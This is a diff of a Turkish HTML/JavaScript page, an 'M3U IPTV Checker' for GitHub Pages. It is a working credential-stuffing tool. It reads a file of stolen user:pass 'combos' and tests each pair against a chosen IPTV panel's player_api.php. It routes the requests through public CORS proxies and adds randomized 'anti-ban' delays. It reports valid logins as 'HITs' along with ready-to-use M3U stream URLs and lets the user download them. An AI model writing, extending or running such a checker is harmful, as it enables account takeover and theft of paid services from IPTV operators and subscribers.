@@ -1,55 +1,90 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>M3U IPTV Checker - GitHub Pages</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* CSS KODLARI BURAYA GELECEK - AŞAĞIDAKİ KODU KOPYALAYIN */
+        /* CSS KODLARIN TAMAMI BURADA - ÖNCEKİ MESAJDAN ALINAN STILLER */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; min-height: 100vh; padding: 20px; }
         .container { max-width: 1200px; margin: 0 auto; }
         .header { text-align: center; margin-bottom: 30px; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); }
         .logo { font-size: 2.5em; background: linear-gradient(45deg, #00b4db, #0083b0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; font-weight: bold; }
         .card { background: rgba(255, 255, 255, 0.05); border-radius: 15px; padding: 25px; margin-bottom: 25px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
+        .card-title { font-size: 1.5em; margin-bottom: 20px; color: #4cc9f0; display: flex; align-items: center; gap: 10px; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; margin-bottom: 8px; color: #89c2d9; font-weight: 500; }
+        .form-control { width: 100%; padding: 12px 15px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 16px; transition: all 0.3s; }
+        .form-control:focus { outline: none; border-color: #4cc9f0; box-shadow: 0 0 0 2px rgba(76, 201, 240, 0.2); }
+        .checkbox-group { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
         .btn { padding: 12px 25px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; }
         .btn-primary { background: linear-gradient(45deg, #00b4db, #0083b0); color: white; }
         .btn-primary:hover { background: linear-gradient(45deg, #0083b0, #005885); transform: translateY(-2px); }
-        .form-control { width: 100%; padding: 12px 15px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 16px; margin-bottom: 15px; }
-        /* KODU KISALTMAK İÇİN CSS'in GERİ KALANI ÇIKARILDI. LÜTFEN TAM CSS'İ ÖNCEKİ MESAJDAN ALIN. */
+        .btn-danger { background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; }
+        .btn-danger:hover { background: linear-gradient(45deg, #ff4b2b, #ff416c); }
+        .progress-container { background: rgba(0, 0, 0, 0.3); border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+        .progress-bar { width: 100%; height: 20px; background: rgba(255, 255, 255, 0.1); border-radius: 10px; overflow: hidden; margin-bottom: 10px; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #00b4db, #0083b0); border-radius: 10px; width: 0%; transition: width 0.5s ease; }
+        .progress-stats { display: flex; justify-content: space-between; color: #89c2d9; font-size: 14px; }
+        .hits-container { max-height: 400px; overflow-y: auto; }
+        .hit-item { background: rgba(0, 0, 0, 0.3); border-radius: 10px; padding: 15px; margin-bottom: 15px; border-left: 4px solid #00b4db; }
+        .log-container { background: rgba(0, 0, 0, 0.3); border-radius: 10px; padding: 15px; height: 300px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 14px; }
+        .hidden { display: none !important; }
+        /* Gerekli diğer CSS kuralları... */
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="container">
+        <!-- Arayüz Bileşenleri -->
         <div class="header">
             <div class="logo">M3U IPTV CHECKER</div>
-            <div class="subtitle">GitHub Pages - İstemci Taraflı Sürüm</div>
+            <div class="subtitle">GitHub Pages - CORS Proxy Desteği ile</div>
         </div>
 
         <div class="card">
             <div class="card-title"><i class="fas fa-cogs"></i> Kontrol Ayarları</div>
-            
             <div class="form-group">
                 <label class="form-label">Panel Adresi:</label>
                 <input type="text" id="panel" class="form-control" placeholder="example.com:8080" required>
             </div>
-            
             <div class="form-group">
                 <label class="form-label">Combo Dosyası (user:pass):</label>
                 <input type="file" id="comboFile" class="form-control" accept=".txt">
             </div>
 
-            <!-- YENİ: CORS Proxy Seçeneği -->
+            <!-- CORS Proxy Seçeneği -->
             <div class="form-group">
-                <div class="checkbox-group">
-                    <input type="checkbox" id="useCorsProxy" class="form-control" style="width: auto;">
-                    <label for="useCorsProxy" class="checkbox-label">CORS Proxy Kullan (CORS hatası alıyorsanız işaretleyin)</label>
-                </div>
+                <label class="form-label">CORS Proxy Servisi:</label>
+                <select id="corsProxySelect" class="form-control">
+                    <option value="">CORS Proxy Kullanma (Doğrudan İstek)</option>
+                    <option value="https://api.allorigins.win/raw?url=">allOrigins Proxy (Önerilen)</option>
+                    <option value="https://corsproxy.io/?" selected>corsproxy.io</option>
+                    <option value="https://cors-anywhere.herokuapp.com/">cors-anywhere (Eski)</option>
+                </select>
+                <small style="color: #89c2d9; display: block; margin-top: 5px;">
+                    GitHub Pages'ten farklı sunuculara istek gönderirken CORS Proxy gerekir.
+                </small>
             </div>
 
-            <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> Kontrol Başlat</button>
-            <button id="stopBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> Durdur</button>
+            <div class="flex">
+                <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> Kontrol Başlat</button>
+                <button id="stopBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> Durdur</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-chart-line"></i> İlerleme Durumu</div>
+            <div id="progressContainer" class="progress-container hidden">
+                <div class="progress-bar"><div id="progressFill" class="progress-fill"></div></div>
+                <div class="progress-stats">
+                    <span id="checkedCount">0</span>/<span id="totalCount">0</span>
+                    <span id="hitCount">Hits: 0</span>
+                    <span id="completionPercent">%0</span>
+                </div>
+            </div>
         </div>
 
         <div class="card">
@@ -59,109 +94,200 @@
     </div>
 
     <script>
-        // JAVASCRIPT KODUNUN ÖNEMLİ BİR KISMI BURADA
-        class GitHubPagesChecker {
+        class M3UGitHubChecker {
             constructor() {
                 this.isRunning = false;
-                // CORS Proxy URL'si (ücretsiz ve açık bir servis, sadece test için)
-                this.corsProxyUrl = "https://api.allorigins.win/raw?url=";
+                this.combos = [];
+                this.hits = [];
+                this.checkedCount = 0;
+                this.startTime = null;
+                
+                // CORS Proxy seçenekleri
+                this.proxyServices = {
+                    'allorigins': 'https://api.allorigins.win/raw?url=',
+                    'corsproxy': 'https://corsproxy.io/?',
+                    'corsanywhere': 'https://cors-anywhere.herokuapp.com/'
+                };
+                
                 this.init();
             }
 
             init() {
+                // Event listener'ları bağla
                 document.getElementById('startBtn').addEventListener('click', () => this.start());
                 document.getElementById('stopBtn').addEventListener('click', () => this.stop());
-                console.log("Checker başlatıldı. CORS Proxy desteği aktif.");
+                
+                // CORS proxy açıklaması
+                this.log('CORS Proxy desteği aktif. GitHub Pages sınırlamaları için gereklidir.');
             }
 
             async start() {
                 const panel = document.getElementById('panel').value;
                 const fileInput = document.getElementById('comboFile').files[0];
-                const useProxy = document.getElementById('useCorsProxy').checked;
-
+                const proxyService = document.getElementById('corsProxySelect').value;
+                
                 if (!panel || !fileInput) {
-                    alert("Lütfen panel adresi ve combo dosyası seçin!");
+                    this.log('Lütfen panel adresi ve combo dosyası seçin!', 'error');
                     return;
                 }
 
-                const combos = await this.readFile(fileInput);
+                // Combo dosyasını oku
+                this.combos = await this.readFile(fileInput);
+                if (this.combos.length === 0) {
+                    this.log('Combo dosyası boş veya format hatalı!', 'error');
+                    return;
+                }
+
+                // UI'ı hazırla
                 this.isRunning = true;
+                this.hits = [];
+                this.checkedCount = 0;
+                this.startTime = Date.now();
+                
                 document.getElementById('startBtn').disabled = true;
                 document.getElementById('stopBtn').disabled = false;
+                document.getElementById('progressContainer').classList.remove('hidden');
+                
+                document.getElementById('totalCount').textContent = this.combos.length;
+                this.updateProgress();
 
-                for (let combo of combos) {
-                    if (!this.isRunning) break;
+                this.log(`Kontrol başlatıldı: ${this.combos.length} combo, Proxy: ${proxyService ? 'Aktif' : 'Yok'}`);
+
+                // Her bir combo için kontrol yap
+                for (let i = 0; i < this.combos.length && this.isRunning; i++) {
+                    const combo = this.combos[i];
                     if (combo.includes(':')) {
-                        const [user, pass] = combo.split(':');
-                        await this.checkAccount(panel, user.trim(), pass.trim(), useProxy);
-                        // Her istekten sonra 2-4 saniye bekle (engellenmemek için)
-                        await this.delay(2000 + Math.random() * 2000);
+                        const [user, pass] = combo.split(':').map(s => s.trim());
+                        await this.checkAccount(panel, user, pass, proxyService);
+                        
+                        // Gecikme ekle (anti-ban)
+                        await this.delay(1000 + Math.random() * 2000);
                     }
                 }
 
-                this.stop();
-                alert("Kontrol tamamlandı!");
+                this.finish();
             }
 
-            stop() {
-                this.isRunning = false;
-                document.getElementById('startBtn').disabled = false;
-                document.getElementById('stopBtn').disabled = true;
-            }
-
-            async checkAccount(panel, user, pass, useProxy) {
+            async checkAccount(panel, user, pass, proxyUrl) {
                 const apiUrl = `http://${panel}/player_api.php?username=${user}&password=${pass}&type=m3u`;
                 let targetUrl = apiUrl;
 
-                // Eğer CORS Proxy seçildiyse, URL'yi proxy'den geçir
-                if (useProxy) {
-                    targetUrl = this.corsProxyUrl + encodeURIComponent(apiUrl);
-                    console.log("CORS Proxy kullanılıyor:", targetUrl);
+                // CORS Proxy kullan
+                if (proxyUrl) {
+                    targetUrl = proxyUrl + encodeURIComponent(apiUrl);
                 }
 
                 try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 10000);
+
                     const response = await fetch(targetUrl, {
                         method: 'GET',
-                        mode: useProxy ? 'cors' : 'no-cors', // Proxy kullanılıyorsa CORS modunda
-                        headers: { 'User-Agent': 'Mozilla/5.0' }
+                        mode: 'cors',
+                        headers: {
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        },
+                        signal: controller.signal
                     });
 
-                    let resultText = "";
-                    if (useProxy) {
-                        // Proxy kullanılıyorsa normal response alınır
-                        resultText = await response.text();
-                    } else {
-                        // Proxy kullanılmıyorsa ve CORS hatası alınıyorsa, bu kısım çalışmayabilir.
-                        // Bu basit örnek için hata yakalama önemli.
-                        resultText = "CORS nedeniyle yanıt okunamıyor olabilir.";
-                    }
+                    clearTimeout(timeoutId);
 
-                    // Yanıtta "active" kelimesi var mı kontrol et (basit bir kontrol)
-                    if (resultText.toLowerCase().includes('"status":"active"')) {
-                        this.displayHit(panel, user, pass);
+                    if (response.ok) {
+                        const text = await response.text();
+                        
+                        // Basit aktif hesap kontrolü
+                        if (text.includes('"status":"active"') || 
+                            text.includes('"status":"Active"') ||
+                            (text.includes('"auth":1') && text.includes('"username"'))) {
+                            
+                            const hitData = {
+                                panel: panel,
+                                user: user,
+                                pass: pass,
+                                m3uUrl: `http://${panel}/get.php?username=${user}&password=${pass}&type=m3u_plus`,
+                                time: new Date().toLocaleTimeString()
+                            };
+                            
+                            this.hits.push(hitData);
+                            this.displayHit(hitData);
+                            this.log(`HIT! ${user}:${pass}`, 'success');
+                        }
                     }
-
                 } catch (error) {
-                    console.error("Hata:", error);
+                    // Hata log'u (konsolda göster)
+                    console.error(`Hata: ${user}:${pass} -`, error.message);
                 }
+
+                this.checkedCount++;
+                this.updateProgress();
             }
 
-            displayHit(panel, user, pass) {
+            displayHit(hitData) {
                 const container = document.getElementById('hitsContainer');
                 const hitDiv = document.createElement('div');
                 hitDiv.className = 'hit-item';
                 hitDiv.innerHTML = `
-                    <strong>HIT!</strong> Panel: ${panel} | Kullanıcı: ${user} | Şifre: ${pass}
-                    <br><small>M3U: http://${panel}/get.php?username=${user}&password=${pass}&type=m3u_plus</small>
+                    <div style="display: flex; justify-content: space-between; align-items: start;">
+                        <div>
+                            <strong style="color: #4cc9f0;">HIT #${this.hits.length}</strong>
+                            <div style="margin-top: 5px;">
+                                <span style="color: #89c2d9;">Kullanıcı:</span> ${hitData.user}<br>
+                                <span style="color: #89c2d9;">Şifre:</span> ${hitData.pass}<br>
+                                <span style="color: #89c2d9;">Zaman:</span> ${hitData.time}
+                            </div>
+                        </div>
+                        <div style="text-align: right;">
+                            <button onclick="navigator.clipboard.writeText('${hitData.m3uUrl}')" 
+                                    style="background: #6c5ce7; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer;">
+                                M3U'yu Kopyala
+                            </button>
+                        </div>
+                    </div>
+                    <div style="margin-top: 10px; font-size: 0.9em; color: #aaa;">
+                        ${hitData.m3uUrl}
+                    </div>
                 `;
                 container.prepend(hitDiv);
             }
 
-            readFile(file) {
-                return new Promise((resolve, reject) => {
+            updateProgress() {
+                const percent = this.combos.length > 0 ? 
+                    Math.round((this.checkedCount / this.combos.length) * 100) : 0;
+                
+                document.getElementById('progressFill').style.width = `${percent}%`;
+                document.getElementById('checkedCount').textContent = this.checkedCount;
+                document.getElementById('hitCount').textContent = `Hits: ${this.hits.length}`;
+                document.getElementById('completionPercent').textContent = `%${percent}`;
+                
+                // CPM hesapla
+                if (this.startTime) {
+                    const minutes = (Date.now() - this.startTime) / 60000;
+                    const cpm = minutes > 0 ? Math.round(this.checkedCount / minutes) : 0;
+                    document.getElementById('cpmText').textContent = `CPM: ${cpm}`;
+                }
+            }
+
+            log(message, type = 'info') {
+                const logContainer = document.getElementById('logContainer');
+                if (!logContainer) return;
+                
+                const time = new Date().toLocaleTimeString();
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerHTML = `<span style="color: #89c2d9">[${time}]</span> <span class="log-${type}">${message}</span>`;
+                logContainer.appendChild(entry);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+
+            async readFile(file) {
+                return new Promise((resolve) => {
                     const reader = new FileReader();
-                    reader.onload = (e) => resolve(e.target.result.split('\n').filter(line => line.trim()));
-                    reader.onerror = reject;
+                    reader.onload = (e) => {
+                        const lines = e.target.result.split('\n')
+                            .map(line => line.trim())
+                            .filter(line => line && line.includes(':'));
+                        resolve(lines);
+                    };
                     reader.readAsText(file);
                 });
             }
@@ -169,11 +295,74 @@
             delay(ms) {
                 return new Promise(resolve => setTimeout(resolve, ms));
             }
+
+            stop() {
+                this.isRunning = false;
+                this.log('Kontrol durduruldu', 'warning');
+            }
+
+            finish() {
+                this.isRunning = false;
+                const elapsed = ((Date.now() - this.startTime) / 1000).toFixed(1);
+                
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+                
+                this.log(`Kontrol tamamlandı! ${this.hits.length} hit bulundu, ${elapsed} saniye sürdü`, 'success');
+                this.log(`Başarı oranı: ${((this.hits.length / this.combos.length) * 100).toFixed(2)}%`);
+                
+                // Sonuçları indirme butonu ekle
+                if (this.hits.length > 0) {
+                    this.addDownloadButton();
+                }
+            }
+
+            addDownloadButton() {
+                const container = document.querySelector('.container');
+                let downloadBtn = document.getElementById('downloadResults');
+                
+                if (!downloadBtn) {
+                    downloadBtn = document.createElement('button');
+                    downloadBtn.id = 'downloadResults';
+                    downloadBtn.className = 'btn';
+                    downloadBtn.innerHTML = '<i class="fas fa-download"></i> Sonuçları İndir';
+                    downloadBtn.style.background = '#00b894';
+                    downloadBtn.style.marginTop = '10px';
+                    downloadBtn.onclick = () => this.downloadResults();
+                    container.appendChild(downloadBtn);
+                }
+            }
+
+            downloadResults() {
+                let content = `M3U IPTV Checker Results\n`;
+                content += `Generated: ${new Date().toLocaleString('tr-TR')}\n`;
+                content += `Total Checks: ${this.checkedCount}\n`;
+                content += `Hits Found: ${this.hits.length}\n\n`;
+                
+                this.hits.forEach((hit, index) => {
+                    content += `[HIT #${index + 1}]\n`;
+                    content += `Username: ${hit.user}\n`;
+                    content += `Password: ${hit.pass}\n`;
+                    content += `M3U URL: ${hit.m3uUrl}\n`;
+                    content += `Found At: ${hit.time}\n`;
+                    content += '-'.repeat(50) + '\n\n';
+                });
+                
+                const blob = new Blob([content], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `m3u_hits_${new Date().toISOString().slice(0,10)}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
         }
 
         // Uygulamayı başlat
         document.addEventListener('DOMContentLoaded', () => {
-            window.checker = new GitHubPagesChecker();
+            window.checker = new M3UGitHubChecker();
         });
     </script>
 </body>
